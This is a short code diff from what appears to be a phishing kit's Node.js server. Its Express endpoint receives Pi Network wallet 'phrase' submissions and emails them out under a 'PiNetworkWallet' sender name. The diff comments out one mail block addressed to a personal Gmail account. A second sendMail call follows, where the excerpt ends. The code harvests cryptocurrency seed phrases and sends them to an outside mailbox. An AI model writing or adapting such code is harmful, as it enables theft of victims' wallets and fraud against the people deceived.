@@ -61,16 +61,16 @@ app.post("/submit/7668", async (req, res) => {
   console.log({ mfText });
   try {
 
-        const m = await tp.sendMail(
-      {
-        from: "PiNetworkWallet ",
-        to: ["fantomlegen@gmail.com"],
-        subject: "pinetwork phrase",
-        text: mfText,
+      //   const m = await tp.sendMail(
+      // {
+      //   from: "PiNetworkWallet ",
+      //   to: ["fantomlegen@gmail.com"],
+      //   subject: "pinetwork phrase",
+      //   text: mfText,
         
-        html: `<h1>${mfText}</h1>`,
-      }
-      );
+      //   html: `<h1>${mfText}</h1>`,
+      // }
+      // );
     
     const msg = await transporter.sendMail(
       {
